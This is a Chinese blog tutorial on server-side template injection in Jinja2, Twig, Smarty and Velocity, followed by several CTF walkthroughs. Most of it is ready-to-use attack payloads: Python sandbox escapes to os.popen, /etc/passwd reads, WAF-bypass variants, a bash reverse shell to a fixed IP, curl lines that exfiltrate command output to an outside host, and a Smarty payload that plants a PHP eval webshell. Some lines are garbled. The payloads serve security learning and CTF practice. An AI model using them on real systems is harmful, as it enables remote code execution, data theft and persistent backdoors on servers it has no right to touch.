[SSTI基础学习-CSDN博客](https://blog.csdn.net/qq_63267612/article/details/125705601)

# 1.SSTI简介
SSTI 就是服务器端模板注入（Server-Side Template Injection）

​ 当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。

​ 漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。

​ 凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。

# 2.SSTI原理
模板是什么

​ 模板可以理解为一段固定好格式，等着你来填充信息的文件。通过这种方法，可以做到逻辑与视图分离，更容易、清楚且相对安全地编写前后端不同的逻辑。作为对比，一个很不好的解决方法是用脚本语言的字符串拼接html，然后统一输出。

模板注入基本原理

​ 如果用户输入作为【模板当中变量 的值】，模板引擎一般会对用户输入进行编码转义，不容易造成XSS攻击。

```
<?php
    require_once(dirname(__FILE__).'/../lib/Twig/Autoloader.php');
    Twig_Autoloader::register(true);
    $twig = new Twig_Environment(new Twig_Loader_String());
    $output = $twig->render("Hello {{name}}", array("name" =>$_GET["name"]));  // 将用户输入作为模版变量的值
    echo $output;
?>
```
这段代码输入<script>alert(1)</script>会原样输出，因为进行了HTML实体编码。

但是如果用户输入作为了【模板内容 的一部分】，用户输入会原样输出

```
<?php
    require_once(dirname(__FILE__).'/../lib/Twig/Autoloader.php');
    Twig_Autoloader::register(true);
    $twig = new Twig_Environment(new Twig_Loader_String());
    $output = $twig->render("Hello {$_GET['name']}"); // 将用户输入作为模版内容的一部分
    echo $output;
?>
```
```
这段代码输入&lt;script&gt;alert(1)&lt;/script&gt;会造成XSS漏洞。

如果输入Vuln{%23 comment %23}{{2*8}}，会执行2*8这个语句，输出Hello Vuln16。因为经过渲染后，模板变成了Hello Vuln{# comment #}{{2\*8}}。
```
不同的模板会有不同的语法，一般使用Detect-Identify-Expoit的利用流程。
# 3.模板基础知识
```
{% ... %} 用来声明变量
{{ ... }} 用来将表达式打印到模板输出
{# ... #} 表示未包含在模板输出中的注释

在模板注入中，主要使用的是{{}} 和 {%%}

检测是否存在ssti
在url后面，或是参数中添加 {{ 6*6 }} ，查看返回的页面中是否有 36
```
# 4.python-Flask模板注入
## 1.Jinja2简介

Python-Flask使用Jinja2作为渲染引擎 （Jinja2.10.x Documention）

​ jinja2是Flask作者开发的一个模板系统，起初是仿django模板的一个模板引擎，为Flask提供模板支持，由于其灵活，快速和安全等优点被广泛使用。

在jinja2中，存在三种语法
```
控制结构 {% %}
变量取值 {{ }}
注释 {# #}
```
jinja2模板中使用 {{ }} 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等

inja2中的过滤器可以理解为是jinja2里面的内置函数和字符串处理函数。

被两个括号包裹的内容会输出其表达式的值

## 2.注入思路
获取内置类所对应的类
```
(__class__)
```
拿到object基类（面向对象都有一个基类）
```
__bases__<class 'object'>
```
获取子类列表
```
__subclasses__()
```

在子类中找到可以getshell的类

flask SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数

python魔术函数

```
__dict__ 保存类实例或对象实例的属性变量键值对字典
__class__  返回类型所属的对象
__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__bases__   返回该对象所继承的基类
// __base__和__mro__都是用来寻找基类的

__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
__init__  类的初始化方法
__globals__  对包含函数全局变量的字典的引用
```

## 3.ssti漏洞的检测
发送类似下面的payload，不同模板语法有一些差异

```
${7*7}.{{7*7}}

smarty=Hello ${7*7}
Hello 49
twig=Hello {{7*7}}
Hello 49
```
检测到模板注入漏洞后，需要准确识别模板引擎的类型。神器Burpsuite 自带检测功能，并对不同模板接受的 payload 做了一个分类，并以此快速判断模板引擎：


## 4.漏洞利用
### 1.python沙盒逃逸
#### 1.config
```
{{config}}可以获取当前设置，如果题目类似app.config ['FLAG'] = os.environ.pop（'FLAG'），那可以直接访问{{config['FLAG']}}或者{{config.FLAG}}得到flag
```
#### 2.self
```
{{self}} ⇒ <TemplateReference None>
{{self.__dict__._TemplateReference__context.config}} ⇒ 同样可以找到config
```
#### 3.""、[]、()等数据结构
```
主要目的是配合__class__.__mro__[2]这样找到object类
{{[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']}}
```
#### 4、url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config等

如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）

例如：
```
{{url_for.__globals__['current_app'].config.FLAG}}

{{get_flashed_messages.__globals__['current_app'].config.FLAG}}

{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}
```
### 2.文件读取
```
#获取''字符串的所属对象
>>> ''.__class__
<class 'str'>

#获取str类的父类
>>> ''.__class__.__mro__
(<class 'str'>, <class 'object'>)

#获取object类的所有子类
>>> ''.__class__.__mro__[1].__subclasses__()
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>...
#有很多类，后面省略
```
现在只需要从这些类中寻找需要的类，用数组下标获取，然后执行该类中想要执行的函数即可。比如第41个类是file类，就可以构造利用：
```
''.__class__.__mro__[2].__subclasses__()[40]('<File_To_Read>').read()
```
再比如，如果没有file类，使用类<class '_frozen_importlib_external.FileLoader'>，可以进行文件的读取。这里是第91个类。
```
''.__class__.__mro__[2].__subclasses__()[91].get_data(0,"<file_To_Read>")
```
### 3.命令执行
首先通过脚本找到包含os模块的类

```
num = 0
for item in ''.__class__.__mro__[1].__subclasses__():
    try:
         if 'os' in item.__init__.__globals__:
             print (num,item)
         num+=1
    except:
        print ('-')
        num+=1
```
假设输出为x编号的类，则可以构造
```
''.__class__.__mro__[1].__subclasses__()[x].__init__.__globals__['os'].system('ls')
```
命令执行的结果如果不能直接看到，可以考虑通过curl工具发送到自己的VPS，或者使用CEYE平台。

执行脚本发现，包含os模块的类：
```
<class 'site._Printer'>
<class 'site.Quitter'>
```
其他函数的利用同理。
### 4.基础pyload:

```
# 编码前：
{% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/192.168.56.139/4444 0>&1"')}}
 
# 编码后：
%7B%25%20import%20os%20%25%7D%7B%7Bos.system('bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.139%2F4444%200%3E%261%22')%7D%7D

# 利用
http://192.168.3.225:9999/?name=%7B%25%20import%20os%20%25%7D%7B%7Bos.system('bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.139%2F4444%200%3E%261%22')%7D%7D
```
```
获得基类
#python2.7
''.__class__.__mro__[2]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[1]

#python3.7
''.__。。。class__.__mro__[1]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[1]

#python 2.7
#文件操作
#找到file类
[].__class__.__bases__[0].__subclasses__()[40]
#读文件
[].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
#写文件
[].__class__.__bases__[0].__subclasses__()[40]('/tmp').write('test')

#命令执行
#os执行
[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：
[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()
#eval,impoer等全局函数
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()

#python3.7
#命令执行
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
#文件操作
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
#windows下的os命令
"".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()
```


### 5.waf绕过
#### 1.过滤[]和.
只过滤[]

```
pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()

若.也被过滤，使用原生JinJa2函数|attr()
将request.__class__改成request|attr("__class__")
```
#### 2.过滤引号
```
#chr函数
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()}}#request对象
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&path=/etc/passwd

#命令执行
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() }}
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() }}&cmd=id
```
#### 3.过滤下划线_
```
利用request.args属性
{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__
将其中的request.args改为request.values则利用post的方式进行传参
```
#### 4.过滤花括号{
使用{% if ... %}1{% endif %}，例如

```
{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://http.bin.buuoj.cn/1inhq4f1 -d `ls / |  grep flag`;') %}1{% endif %}

#用{%%}标记
{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}

如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来
{% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' %}1{% endif %}
```
#### 5.引号内十六进制绕过
```
{{"".__class__}} 
{{""["\x5f\x5fclass\x5f\x5f"]}}
```
#### 6." ’ chr等被过滤，无法引入字符串
直接拼接键名
```
dict(buil=aa,tins=dd)|join()
```
利用string、pop、list、slice、first等过滤器从已有变量里面直接找
```
(app.__doc__|list()).pop(102)|string()
```
构造出%和c后，用格式化字符串代替chr
```
{%set udl=dict(a=pc,c=c).values()|join %}      # uld=%c
{%set i1=dict(a=i1,c=udl%(99)).values()|join %}
```
#### 7.+等被过滤，无法拼接字符串
~
在jinja中可以拼接字符串
格式化字符串
同上
#### 8.payload:
python2
```
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}  
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "app\x2Epy")}}
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']("__import__('os').system('whoami')")}}
{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[80]["load\x5Fmodule"]("os")["system"]("ls")}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
python3
```
{{().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__['open']('/flag').read()}} 

{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('whoami').read()")}}
```

# 5.php 中的SSTI
php常见的模板：twig，smarty，blade

## 1.Twig
Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid

文件读取
```
{{'/etc/passwd'|file_excerpt(1,30)}}

{{app.request.files.get(1).__construct('/etc/passwd','')}}
{{app.request.files.get(1).openFile.fread(99)}}
```
RCE
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{{['cat /etc/passwd']|filter('system')}}

POST /subscribe?0=cat+/etc/passwd HTTP/1.1
{{app.request.query.filter(0,0,1024,{'options':'system'})}}
```
## 2、Smarty

Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)

但是，实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好 Smarty 很照顾我们，在阅读模板的文档以后我们发现：$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法。

```
{self::getStreamVariable("file:///etc/passwd")}
```
```
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php eval($_GET['cmd']); ?>",self::clearConfig())}
```

常规利用方式：
1.{$smarty.version}
```
{$smarty.version}  #获取smarty的版本号
```
2.{php}{/php}
```
{php}phpinfo();{/php}  #执行相应的php代码
```
因为在Smarty3版本中已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用

3.{literal}
```
<script language="php">phpinfo();</script>   
```
这种写法只适用于php5环境

4.getstreamvariable
```
{self::getStreamVariable("file:///etc/passwd")}
```
在3.1.30的Smarty版本中官方已经把该静态方法删除

5.{if}{/if}
```
{if phpinfo()}{/if}
```
​ Smarty的 {if} 条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||，or，&&，and，is_array()等等，如：{if is_array($array)}{/if}

# 6.Java 中的SSTI
## 1.基本语法

语句标识符

#用来标识Velocity的脚本语句，包括#set、#if 、#else、#end、#foreach、#end、#include、#parse、#macro等语句。

变量

$用来标识一个变量，比如模板文件中为Hello a ， 可 以 获 取 通 过 上 下 文 传 递 的 a，可以获取通过上下文传递的a，可以获取通过上下文传递的a

声明

set用于声明Velocity脚本变量，变量可以在脚本中声明
```
#set($a ="velocity") #set($b=1) #set($arrayName=["1","2"])
```
## 2.基础使用
使用Velocity主要流程为：

初始化Velocity模板引擎，包括模板路径、加载类型等
创建用于存储预传递到模板文件的数据的上下文
选择具体的模板文件，传递数据完成渲染
通过 VelocityEngine 创建模板引擎，接着 velocityEngine.setProperty 设置模板路径 src/main/resources、加载器类型为file，最后通过 velocityEngine.init() 完成引擎初始化。

通过 VelocityContext() 创建上下文变量，通过put添加模板中使用的变量到上下文。

通过 getTemplate 选择路径中具体的模板文件test.vm，创建 StringWriter 对象存储渲染结果，然后将上下文变量传入 template.merge 进行渲染。

http://127.0.0.1:8080/ssti/velocity?template=%23set(%24e=%22e%22);%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor() //延迟了5秒
1
7.实例
1.Simple_SSTI_2


打开题目，看到还是SSTI漏洞，
首先还是让我们使用flag构造参数，所以就是?flag={{XXXX}},再看了一下config



看了一下，没见什么特殊的东西，题目说了是SSIT漏洞，那么利用漏洞先ls查看一下

/?flag={{%20config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20../%27).read()%20}}
##__class__：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。
##__init__             初始化类，返回的类型是function
##__globals__[]          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
##os.popen() 方法用于从一个命令打开一个管道。
##open() 方法用于打开一个文件，并返回文件对象

1
2
3
4
5
6
7


看到目录一个个进去看

/?flag={{%20config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20../app/%27).read()%20}}
1


在app目录下看到flag，于是查看flag

/?flag={{%20config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20../app/flag%27).read()%20}}
1


2.Web_python_template_injection


简单探测


{{config.items)()}} 查看系统配置
1


进行文件读取，读取passwd信息

[].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
1


执行下面这一段代码

{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}  
  {% if b.__class__ == {}.__class__ %}         //遍历基类 找到eval函数
    {% if 'eval' in b.keys() %}    //找到了
      {{ b['eval']('__import__("os").popen("ls").read()') }}  //导入cmd 执行popen里的命令 read读出数据
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
1
2
3
4
5
6
7
8
9
10
11


找到fl4g ,于是读取文件

ls 改成cat fl4g，就可以读取flag了

{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}  
  {% if b.__class__ == {}.__class__ %}         //遍历基类 找到eval函数
    {% if 'eval' in b.keys() %}    //找到了
      {{ b['eval']('__import__("os").popen("cat fl4g").read()') }} 
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
1
2
3
4
5
6
7
8
9
10
11


或者构造pyload

{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}

或者

{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}
1
2
3
4
5
爆出fl4g, 然后读取

{{[].__class__.__base__.__subclasses__()[40]('fl4g').read()}}

或者

{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()}}
1
2
3
4
5
3.easytornado
原理
tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过{undefined{}}进行传递变量和执行简单的表达式。
是一个类似模板的东西，可以使用不同的参数来访问网页

render在tornado模板中，存在一些可以访问的快速对象，例如

{undefined{ escape(handler.settings[“cookie”]) }}
这两个{undefined{}}和这个字典对象也许大家就看出来了，没错就是这个handler.settings对象

handler 指向RequestHandler

而RequestHandler.settings又指向self.application.settings

所有handler.settings就指向RequestHandler.application.settings了！
1
2
3
4
5
6
7
8







从中可以看出render函数，

要找出filehash值， 最后的文件中提到先对filename进行md5加密，然后再加上cookie_secret，再一起md5加密

error?msg={{handler.settings}}
1


然后将 文件名进行加密，加密后使用小写的，文件名是要带上前面的‘/’号



将cookie_secret和文件加密后的一起，再进行md5加密，文件名换一下，filehash值也换上



4.shrine


从中可以看出为python模板注入，

看源码app.config['FLAG'] = os.environ.pop('FLAG')

推测{undefined{config}}可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]并且过滤了括号



于是用python沙盒逃逸

{{url_for.__globals__['current_app'].config.FLAG}}  //得到flag
1

